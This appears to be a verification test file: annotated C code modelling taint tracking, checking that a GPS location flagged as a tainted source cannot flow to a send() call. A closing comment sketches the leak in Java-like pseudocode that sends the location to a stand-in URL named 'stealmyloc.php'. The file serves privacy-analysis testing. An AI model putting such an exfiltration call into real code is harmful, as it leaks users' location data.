struct location{int info;};
struct cell{struct location* loc;};

/*@ pred_prim source<b:bool>; */

struct location* getGPSLocation() __attribute__ ((noreturn))
/*@
  requires true
  ensures  res::location<_> * res::source<false>;
//  ensures  res::location<_> * res::source<true>;
*/;

void send(struct location* x, int location) __attribute__ ((noreturn))
/*@ 
 case {
  x = null  -> requires true ensures true; // false
  x != null -> requires x::location<_> * x::source<b> & !b
               ensures true;
 }
*/;

void test_taint(struct cell* d, int R, int loc)
/*@
  requires d::cell<l> * d::source<b> * l::location<_> * l::source<b2>  & !b & !b2 
  ensures  true;
*/
{
  struct location* x; // = null;
  //assign(x,null);
  if(R) x = getGPSLocation();
  //  dprint;
  d->loc = x;
  //  dprint;
  if(R) send(d->loc, loc);
}

/*
Data d = new Data();
Location x = null;
if(R) x = getGPSLocation();
d.loc = x ;
if(R) send(d.loc, "http://xue.com/stealmyloc.php");
*/
